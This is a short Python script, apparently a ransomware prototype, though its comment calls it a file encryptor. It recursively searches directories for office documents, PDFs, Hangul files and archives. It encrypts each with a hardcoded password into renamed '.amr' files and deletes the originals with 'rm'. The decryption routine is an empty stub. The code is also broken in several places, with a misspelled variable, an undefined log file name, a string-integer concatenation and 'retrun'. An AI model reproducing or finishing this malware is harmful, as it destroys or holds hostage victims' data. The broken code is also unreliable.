/* this function is to encrypt files with AES in pycrypto
   used anaconda to install packages.
*/
import os
import subprocess
import enc_module
import random

extlist = ['.doc' , '.docx', '.ppt', '.pptx', '.pdf', '.txt', '.hwp',
           '.xls', '.xlsx', '.zip', '.tar']
count = 0
filecount = 0

password = "sssencryptsss"
enc_name = "year"
enc_name_head = "enc_file"
serial_number = 0

footer = ".amr"
# make dictionary for enc_file_name and original file name pair
enc_dec_dict = {}


def search_encrypt(dirname):
    global enc_name, serial_number
    try:
        filenames = os.listdir(dirname)
        for filename in filenames:
            full_filename = os.path.join(dirname, filename)
            if os.path.isdir(full_filename):
                search_encrypt(full_filename)
            else:
                outfile_name = dirname + "/" + enc_name_head + enc_name + serial_number + footer
                ext = os.path.splitext(ful_filename)[-1]
                if (ext in extlist):
                    with open(logfilename, "a") as writefile:
                        writefile.write(outfile_name + "|" + full_filename + "|" + "\n")
                    enc_module.encrypt_file(full_filename, outfile_name, password)
                    subprocess.getoutput("rm "+"'"+full_filename+"'")
                serial_number = serial_number +1
    except PermissionError:
        pass

def search_decrypt():
    return 0

def process_start():
    retrun 0
